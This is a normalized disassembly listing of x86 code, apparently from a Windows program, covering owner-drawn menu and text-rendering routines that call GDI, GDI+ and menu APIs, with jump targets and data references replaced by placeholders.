mov ecx ebx
call edx
cmp [ ebp + 0xc ] 0x0
je r-xdata
movzx eax [ ebx + 0x38 ]
mov edx [ ebx ]
mov edx [ edx + 0x4 ]
push eax
mov ecx ebx
call edx
mov eax [ eax + 0xd4 ]
jmp r-xdata
mov eax [ eax + 0xcc ]
mov eax [ eax + 0xd0 ]
jmp r-xdata
push eax
mov eax [ edi ]
push eax
call [ SetTextColor@IAT ]
mov eax [ ebx + 0x10 ]
mov ecx [ edi ]
push eax
push ecx
call [ SelectObject@IAT ]
cmp [ ebx + 0x3c ] 0x0
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x34 ] 0x24
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
mov ebx [ DrawTextW@IAT ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x28 ] edx
mov edx [ ebp - 0xc ]
or eax 0x400
push eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x20 ] ecx
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx [ edi ]
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x30 ]
push edx
push eax
push ecx
call ebx
mov edx [ ebp - 0x34 ]
mov ecx [ ebp - 0x30 ]
push edx
mov edx [ ebp - 0x3c ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
push ecx
push edx
push eax
call ebx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] ecx
mov ecx [ ebp - 0xc ]
mov [ esi + 0x4 ] edx
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x28 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x2c ]
add edx 0x2
mov [ esi + 0xc ] ecx
add [ esi ] edx
test eax eax
jle r-xdata
mov [ ebp - 0x34 ] 0x8024
mov edx [ ebp - 0x44 ]
mov eax [ edi ]
push edx
push eax
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x8 ]
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x38 ]
push 0x26
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx [ edx ]
mov edx [ ecx - 0xc ]
mov ecx [ edi ]
sub edx eax
mov eax [ ebp - 0x40 ]
dec edx
push edx
push eax
push ecx
call ebx
sub_41c7d0
push ebp
mov ebp esp
push 0xffffffff
push sub_44aef3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x120
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov esi [ edi + 0x2c ]
mov ecx [ edi + 0x18 ]
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0xd0 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
mov ebx [ edi + 0x14 ]
mov [ ebp - 0xac ] ebx
mov [ ebp - 0x4 ] 0x2
lea edx [ ebp - 0xec ]
push edx
mov [ ebp - 0xe8 ] eax
push ebx
mov [ ebp - 0xe4 ] eax
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xdc ] eax
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0xd4 ] eax
mov [ ebp - 0xec ] 0x1c
mov [ ebp - 0xe8 ] 0x8
call [ GetMenuInfo@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x9c ] 0x0
mov eax [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x9c ] eax
jmp r-xdata
test [ edi + 0xc ] 0x1
mov [ ebp - 0x9d ] 0x0
je r-xdata
test al al
je r-xdata
mov eax [ edi + 0x10 ]
mov ecx eax
and ecx 0x4
mov [ ebp - 0x124 ] ecx
mov ecx eax
and ecx 0x1
and eax 0x8
cmp [ esi + 0x4 ] 0x0
mov [ ebp - 0x120 ] ecx
mov ecx [ ebp - 0x9c ]
mov dl [ ecx + 0x4 ]
mov [ ebp - 0x128 ] eax
mov al [ esi + 0x18 ]
push ebx
mov [ ebp - 0x12c ] al
mov [ ebp - 0xa0 ] dl
sete [ ebp - 0x9e ]
call [ GetMenuItemCount@IAT ]
mov ecx [ esi + 0x4 ]
mov bl [ ebp - 0x9e ]
inc ecx
cmp eax ecx
sete al
mov [ ebp - 0x9f ] al
test bl bl
je r-xdata
mov edx [ ebp - 0xd0 ]
xor eax eax
lea ecx [ ebp - 0x34 ]
push ecx
push edx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
call [ GetClipBox@IAT ]
mov ecx [ ebp - 0xa8 ]
mov esi [ ebp - 0x2c ]
mov edi [ ebp - 0x28 ]
sub esi [ ebp - 0x34 ]
sub edi [ ebp - 0x30 ]
add ecx 0x28
lea ebx [ ebp - 0xac ]
lea eax [ ebp - 0xa4 ]
call sub_41e990
mov eax [ ebp - 0xa8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0xa4 ]
xor ebx ebx
cmp ecx eax
jne r-xdata
test bl bl
je r-xdata
mov ecx [ esi + 0x8 ]
lea edx [ ebp - 0xa4 ]
push edx
call sub_402a00
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0xa4 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov esi [ ecx + 0x10 ]
mov edi [ ecx + 0x14 ]
cmp [ ebp - 0x9d ] bl
je r-xdata
mov [ ebp - 0x9d ] 0x1
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov esi [ ebp - 0xa8 ]
mov edi [ ebp - 0xb4 ]
lea edx [ ebp - 0xf8 ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x9c ]
push ecx
lea edx [ ebp - 0xac ]
push edx
push esi
mov ecx edi
mov [ ebp - 0xac ] ebx
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xf8 ] ebx
call sub_41bab0
lea eax [ ebp - 0xa4 ]
push eax
lea ecx [ ebp - 0xfc ]
push ecx
push edi
mov [ ebp - 0xf4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0xa4 ] ebx
push esi
lea ebx [ ebp - 0xb0 ]
lea esi [ ebp - 0xf4 ]
call sub_41bc10
mov edi [ ebp - 0xa8 ]
cmp [ edi + 0x39 ] 0x0
mov esi [ ebp - 0x38 ]
mov ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x44 ]
mov edx esi
jne r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x40 ] ecx
mov eax [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x20 ] eax
xor eax eax
push 0xffffffff
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x1c ] ecx
xor ecx ecx
push 0xffffffff
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] edi
call [ InflateRect@IAT ]
cmp [ ebp - 0xa0 ] bl
je r-xdata
push r--data
push r--data
call [ FindWindowA@IAT ]
mov ecx [ ebp - 0x9c ]
mov [ ecx ] eax
cmp eax ebx
je r-xdata
xor edx edx
cmp [ ebp - 0xa0 ] dl
sete dl
add ecx edx
inc eax
lea edx [ esi - 0x1 ]
lea esi [ eax + 0x18 ]
lea esi [ eax + 0x20 ]
jmp r-xdata
mov ebx [ ebp - 0xa8 ]
lea edx [ ebp - 0xac ]
add ebx 0x28
call sub_41e860
mov [ eax ] esi
mov [ eax + 0x4 ] edi
xor ebx ebx
jmp r-xdata
mov edx [ ebp - 0xac ]
push edx
push 0xffffffeb
push eax
call [ SetWindowLongW@IAT ]
mov eax [ ebp - 0x9c ]
mov ecx [ eax ]
push r--data
push ecx
call [ SetWindowTextA@IAT ]
mov eax [ ebp - 0x3c ]
mov esi [ ebp - 0x70 ]
mov edx [ ebp - 0x44 ]
mov ecx [ ebp - 0x40 ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0x68 ]
mov edi esi
mov [ ebp - 0xcc ] edx
mov [ ebp - 0xc8 ] edi
mov [ ebp - 0xc0 ] eax
test bl bl
je r-xdata
push 0x3
push 0x0
lea edx [ ebp - 0x74 ]
push edx
call [ OffsetRect@IAT ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0xb8 ]
add eax 0x1c
mov [ ebp - 0x60 ] ecx
push eax
lea ecx [ ebp - 0x74 ]
push ecx
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] edx
call [ CopyRect@IAT ]
mov bl [ ebp - 0x9e ]
test bl bl
jne r-xdata
cmp [ ebp - 0x9f ] 0x0
je r-xdata
cmp [ ebp - 0x9f ] 0x0
mov [ ebp - 0xc8 ] ecx
mov edi ecx
jne r-xdata
mov ebx [ ebp - 0xcc ]
mov ecx [ ebp - 0xcc ]
mov esi [ ebp - 0xc0 ]
add edx [ ebp - 0xac ]
sub esi [ ebp - 0xf8 ]
mov [ ebp - 0x11c ] ebx
mov ebx [ ebp - 0xc4 ]
mov [ ebp - 0x114 ] ebx
mov ebx [ ebp - 0xc0 ]
mov [ ebp - 0x54 ] ecx
mov ecx [ ebp - 0xc4 ]
sub ecx [ ebp - 0x9c ]
mov [ ebp - 0x110 ] ebx
mov ebx [ ebp - 0x64 ]
mov eax edi
add eax [ ebp - 0xf0 ]
cmp [ ebp - 0x9e ] 0x0
mov [ ebp - 0x11c ] ebx
mov ebx [ ebp - 0x5c ]
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x114 ] ebx
je r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0xc0 ] ecx
test bl bl
jne r-xdata
sub eax esi
lea ecx [ eax + ecx + 0x2 ]
mov [ ebp - 0xc0 ] ecx
jmp r-xdata
cmp [ ebp - 0x9f ] 0x0
je r-xdata
mov ebx [ ebp - 0x60 ]
mov [ ebp - 0x118 ] ebx
sub ecx eax
lea eax [ ecx + esi - 0x2 ]
mov [ ebp - 0xc8 ] eax
mov edi eax
add eax [ ebp - 0xfc ]
sub ecx [ ebp - 0xb0 ]
sub esi [ ebp - 0xa4 ]
mov [ ebp - 0x10c ] edx
add edx [ ebp - 0xf4 ]
xor ebx ebx
mov [ ebp - 0x10c ] edx
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x104 ] ecx
mov [ ebp - 0x100 ] esi
cmp [ ebp - 0x9d ] bl
je r-xdata
mov ebx [ ebp - 0x58 ]
mov [ ebp - 0x110 ] ebx
mov ecx [ ebp - 0xc0 ]
sub eax edi
sub eax 0x4
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x18 ] ecx
jns r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax ecx
sub eax esi
sub eax 0x4
jns r-xdata
add edi eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x20 ] edi
cmp edi eax
jg r-xdata
mov esi [ ebp - 0xd0 ]
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x98 ]
push ecx
lea edi [ ebp - 0x34 ]
mov ecx esi
call sub_41b390
mov [ ebp - 0x4 ] 0x4
push 0x11
call [ GetStockObject@IAT ]
mov edx [ ebp - 0x98 ]
push eax
push edx
call [ SelectObject@IAT ]
mov eax [ ebp - 0x98 ]
push 0x1
push eax
call [ SetBkMode@IAT ]
mov edx [ ebp - 0x98 ]
lea ecx [ ebp - 0xa4 ]
push ecx
push edx
mov [ ebp - 0xa4 ] ebx
call [ GdipCreateFromHDC@IAT ]
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0xbc ]
push 0x5
push ecx
call [ GdipSetInterpolationMode@IAT ]
cmp eax ebx
je r-xdata
sub ecx eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x18 ] ecx
cmp ecx eax
jl r-xdata
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0xbc ]
push 0x4
push edx
call [ GdipSetPixelOffsetMode@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x4 ] 0x6
push esi
call [ CreateCompatibleDC@IAT ]
mov [ ebp - 0x9c ] eax
lea eax [ ebp - 0x98 ]
lea ecx [ ebp - 0xbc ]
lea edx [ ebp - 0x9c ]
mov [ ebp - 0xe4 ] r--data
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xdc ] eax
mov [ ebp - 0xd8 ] ecx
mov [ ebp - 0xd4 ] edx
mov [ ebp - 0x4 ] 0x7
mov edi [ ebp - 0xa8 ]
mov esi [ ebp - 0x98 ]
lea ebx [ ebp - 0x34 ]
mov ecx edi
call sub_41c150
lea eax [ ebp - 0xe4 ]
push eax
lea ecx [ ebp - 0x44 ]
mov edx edi
call sub_41c220
cmp [ edi + 0x39 ] 0x0
je r-xdata
mov [ ebp - 0xb8 ] eax
mov ebx [ ebp - 0x120 ]
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xdc ]
mov esi [ ecx ]
mov [ ebp - 0x4 ] 0x8
movzx eax [ edi + 0x38 ]
mov edx [ edi ]
mov edx [ edx + 0x4 ]
push eax
mov ecx edi
call edx
mov eax [ eax + 0xdc ]
push eax
push esi
call [ SetBkColor@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov esi [ ebp - 0xb4 ]
test [ esi + 0xc ] 0x800
je r-xdata
lea ecx [ ebp - 0x10c ]
push ecx
lea edx [ ebp - 0xcc ]
push edx
lea eax [ ebp - 0xe4 ]
push eax
lea edx [ ebp - 0x44 ]
mov ecx edi
call sub_41c340
mov [ ebp - 0x4 ] 0x7
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x64 ]
push eax
push 0x2
push 0x0
push 0x0
push esi
call [ ExtTextOutW@IAT ]
push ebx
push esi
call [ SetBkColor@IAT ]
mov edx [ ebp - 0x12c ]
test ebx ebx
setne bl
cmp [ ebp - 0x128 ] 0x0
push edx
mov edx [ esi + 0x14 ]
setne al
movzx ecx al
push ecx
push ebx
push edx
lea eax [ ebp - 0xe4 ]
push eax
push edi
lea edx [ ebp - 0x10c ]
lea ecx [ ebp - 0x11c ]
call sub_41c440
lea ecx [ ebp - 0xb0 ]
push ecx
mov ecx [ esi + 0x8 ]
call sub_402a00
mov [ ebp - 0x4 ] 0x9
xor eax eax
cmp [ ebp - 0x124 ] eax
mov [ ebp - 0x24 ] eax
setne dl
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
movzx eax dl
mov edx [ ebp - 0xa8 ]
push eax
push ebx
lea ecx [ ebp - 0x10c ]
push ecx
lea esi [ ebp - 0x24 ]
lea ecx [ ebp - 0xb0 ]
lea edi [ ebp - 0x98 ]
call sub_41c630
mov edx [ ebp - 0xb4 ]
mov esi [ edx + 0x1c ]
xor edi edi
cmp esi edi
je r-xdata
lea ecx [ ebp - 0xe4 ]
push ecx
lea edx [ ebp - 0x54 ]
lea ecx [ ebp - 0xcc ]
call sub_41bf30
cmp [ ebp - 0x78 ] 0x0
jne r-xdata
mov eax [ ebp - 0xb4 ]
test [ eax + 0x10 ] 0x10
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
mov [ ebp - 0x48 ] eax
add eax [ ebp - 0x20 ]
mov [ ebp - 0x4c ] ecx
add ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
push 0x1
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x50 ] edi
mov edx [ esi ]
mov edx [ edx + 0x14 ]
push ecx
lea eax [ ebp - 0xe4 ]
push eax
mov ecx esi
call edx
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0xe4 ] r--data
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x9c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8c ]
mov ecx [ ebp - 0x90 ]
mov edx [ ebp - 0x98 ]
push 0xcc0020
push eax
push ecx
push edx
mov edx [ ebp - 0x84 ]
sub edx eax
push edx
mov edx [ ebp - 0x88 ]
sub edx ecx
push edx
push eax
mov eax [ ebp - 0x94 ]
push ecx
push eax
mov [ ebp - 0x78 ] 0x1
call [ BitBlt@IAT ]
mov ecx [ ebp - 0x7c ]
mov edx [ ebp - 0x98 ]
push ecx
push edx
call [ SelectObject@IAT ]
mov eax [ ebp - 0x9c ]
mov esi [ DeleteDC@IAT ]
cmp eax edi
je r-xdata
push ebx
lea ecx [ ebp - 0xe4 ]
push ecx
mov ecx [ ebp - 0xa8 ]
lea edi [ ebp - 0x10c ]
call sub_41c040
xor edi edi
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0xbc ]
push eax
call [ GdipDeleteGraphics@IAT ]
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x98 ]
push ecx
call sub_41b480
jmp r-xdata
push eax
mov [ ebp - 0x9c ] 0x0
call [ DeleteDC@IAT ]
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0xb0 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push eax
call esi
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0xe4 ] r--data
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x9c ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x9c ] edi
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0xbc ]
push ecx
call [ GdipDeleteGraphics@IAT ]
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp - 0x98 ]
push edx
call sub_41b480
mov eax [ ebp - 0xb4 ]
test [ eax + 0x10 ] 0x10
je r-xdata
push eax
mov [ ebp - 0x9c ] edi
call esi
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0xc0 ]
push edx
push eax
lea ecx [ eax - 0x1e ]
mov eax [ ebp - 0xc8 ]
push eax
push ecx
mov ecx [ ebp - 0xd0 ]
push ecx
call [ ExcludeClipRect@IAT ]
sub_41d140
push ebp
mov ebp esp
push 0xffffffff
push sub_445125
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x28 ]
push eax
push ecx
mov [ ebp - 0x28 ] 0x1c
mov [ ebp - 0x24 ] 0x8
call [ GetMenuInfo@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_41d1f0
push ebp
mov ebp esp
push 0xffffffff
push sub_445101
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
xor eax eax
mov [ ebp - 0x28 ] eax
push 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x2c ] 0x1c
mov [ ebp - 0x28 ] 0x8
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov [ ebp - 0x4 ] dl
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x5 ] dl
mov [ eax + 0xc ] ecx
lea edx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
push edx
push eax
call [ SetMenuInfo@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_41d2a0
push ebp
mov ebp esp
push 0xffffffff
push sub_445fa3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x240
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov [ ebp - 0x208 ] eax
mov [ ebp - 0x1fc ] edi
mov esi edx
mov [ ebp - 0x4 ] 0x0
push r--data
push r--data
call [ FindWindowA@IAT ]
push edi
mov ebx eax
push 0xffffffeb
push ebx
mov [ ebp - 0x204 ] ebx
call [ SetWindowLongW@IAT ]
push r--data
push ebx
call [ SetWindowTextA@IAT ]
mov ebx [ ebp - 0x208 ]
mov eax [ ebx + 0x20 ]
lea edx [ ebx + 0x1c ]
xor ecx ecx
mov [ ebp - 0x248 ] edx
test eax eax
jle r-xdata
mov ecx edi
call sub_41d140
mov [ ebp - 0x210 ] eax
test eax eax
jne r-xdata
mov edx [ edx ]
push edi
mov [ ebp - 0x1f5 ] 0x0
call [ GetMenuItemCount@IAT ]
mov esi eax
xor ebx ebx
mov [ ebp - 0x20c ] esi
mov [ ebp - 0x214 ] 0xffffffff
mov [ ebp - 0x200 ] ebx
test esi esi
jle r-xdata
mov [ ebp - 0x22c ] eax
push 0x10
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x224 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] 0x1c
mov [ ebp - 0x22c ] 0x8
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
cmp ecx 0xffffffff
je r-xdata
inc ecx
add edx 0x4
cmp ecx eax
jl r-xdata
mov eax [ ebp - 0x210 ]
test eax eax
je r-xdata
xor edx edx
push 0xc6
push edx
lea eax [ ebp - 0xda ]
push eax
mov [ ebp - 0xdc ] dx
call memset
push 0x30
lea ecx [ ebp - 0x244 ]
push 0x0
push ecx
call memset
push 0x110
lea edx [ ebp - 0x1f0 ]
push 0x0
push edx
mov [ ebp - 0x244 ] 0x30
call memset
add esp 0x24
lea eax [ ebp - 0x1f4 ]
push eax
mov [ ebp - 0x1f4 ] 0x114
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x1
jmp r-xdata
cmp [ edx ] edi
je r-xdata
mov esi [ ebp - 0x248 ]
lea ebx [ ebp - 0x204 ]
mov [ ebp - 0x204 ] edi
call sub_41e9f0
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov cl [ ebp - 0x1f5 ]
mov edx [ ebp - 0x204 ]
mov [ eax + 0x4 ] cl
mov [ eax ] edx
mov [ ebp - 0x244 ] 0x2c
mov eax [ ebp - 0x1f0 ]
cmp eax 0x5
jae r-xdata
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x230 ]
push ecx
mov [ eax + 0x5 ] 0x0
mov [ eax + 0xc ] ebx
push edi
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x218 ] eax
call [ SetMenuInfo@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
push 0x20
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
cmp [ ebp - 0x234 ] 0x29b
jne r-xdata
lea edx [ ebp - 0x244 ]
push edx
push 0x1
push ebx
lea ecx [ ebp - 0xdc ]
push edi
mov [ ebp - 0x21c ] 0x64
mov [ ebp - 0x240 ] 0x3e
mov [ ebp - 0x220 ] ecx
call [ GetMenuItemInfoW@IAT ]
test ebx ebx
jne r-xdata
cmp eax 0x4
jne r-xdata
xor esi esi
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x14 ] 0xffffffff
mov esi eax
jmp r-xdata
mov [ ebp - 0x1f5 ] 0x1
jmp r-xdata
cmp [ ebp - 0x1ec ] 0x5a
jae r-xdata
or [ ebp - 0x23c ] 0x800
test [ esi + 0x10 ] 0x2
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x214 ]
inc eax
push 0x400
mov [ esi ] edi
mov [ ebp - 0x214 ] eax
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x23c ]
push ebx
push edi
mov [ esi + 0xc ] eax
call [ GetMenuState@IAT ]
mov [ esi + 0x10 ] eax
or [ ebp - 0x23c ] 0x100
cmp [ ebp - 0x234 ] 0x29b
je r-xdata
inc ebx
mov [ ebp - 0x200 ] ebx
cmp ebx esi
jl r-xdata
mov ecx [ ebp - 0x208 ]
mov edx [ ecx ]
mov edx [ edx ]
push esi
lea eax [ ebp - 0x244 ]
push eax
call edx
test [ esi + 0xc ] 0x800
je r-xdata
push 0x29
lea edx [ ebp - 0xda ]
push edx
call [ StrChrIW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x23c ]
shr ecx 0x9
and cl 0x1
mov [ esi + 0x18 ] cl
cmp [ ebp - 0xdc ] 0x28
lea ebx [ ebp - 0xdc ]
jne r-xdata
cmp [ ebp - 0x1f5 ] 0x0
je r-xdata
push ebx
call [ lstrlenW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x0
jmp r-xdata
mov edi [ ebp - 0x1fc ]
lea eax [ ebp - 0xda ]
cmp edi eax
jbe r-xdata
push 0x400
push 0x0
push edi
call [ RemoveMenu@IAT ]
mov edi [ ebp - 0x1fc ]
xor ecx ecx
lea eax [ edi + 0x1 ]
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_443fa9
add esp 0x4
push ebx
push eax
mov [ esi + 0x8 ] eax
call [ lstrcpyW@IAT ]
mov eax [ esi + 0x8 ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov edx [ ebp - 0x23c ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x240 ] 0x20
cmp edx [ esi + 0xc ]
je r-xdata
mov ecx eax
push ecx
call [ _wtoi@IAT ]
add esp 0x4
lea ebx [ edi + 0x2 ]
test eax eax
js r-xdata
mov ebx [ ebp - 0x208 ]
mov eax [ ebx + 0x40 ]
lea ecx [ ebp - 0xdc ]
mov [ ebp - 0x240 ] 0x30
mov [ esi + 0x14 ] eax
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov edx [ ebp - 0x200 ]
lea ecx [ ebp - 0x244 ]
push ecx
push 0x1
push edx
push edi
call [ SetMenuItemInfoW@IAT ]
